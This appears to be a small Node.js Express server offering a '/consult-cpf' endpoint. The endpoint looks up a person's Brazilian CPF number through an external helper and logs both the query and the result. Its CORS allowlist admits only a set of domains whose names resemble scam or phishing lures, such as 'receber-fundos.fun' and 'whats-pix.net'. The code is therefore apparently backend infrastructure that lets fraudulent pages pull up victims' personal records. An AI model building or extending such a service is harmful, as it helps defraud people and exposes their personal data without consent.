import express from 'express';
import cors from 'cors';
import { consultCpf } from './apis/cpf/index.js';

const PORT = 3001;
const app = express();

const allowedOrigins = [
  'http://localhost:8080',
  'https://vivabem-sempre.online',
  'https://portaloficial-oferta.me',
  'https://marcas-lucrativas.fun',
  'https://receber-fundos.fun',
  'https://vida-facil.me',
  'https://whats-pix.net',
  'https://vidamaisfacil.net',
];

const corsOptions = {
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  }
};

app.use(cors(corsOptions));

app.listen(PORT, () => {
  console.log(`Rodando na porta ${PORT}`);
});

app.get('/consult-cpf', async (req, res) => {
  const parametros = req.query;

  console.log('Parâmetros recebidos:', parametros);
  const result = await consultCpf(req.query.cpf);
  console.log('resultado:', result);

  res.send(result);
});
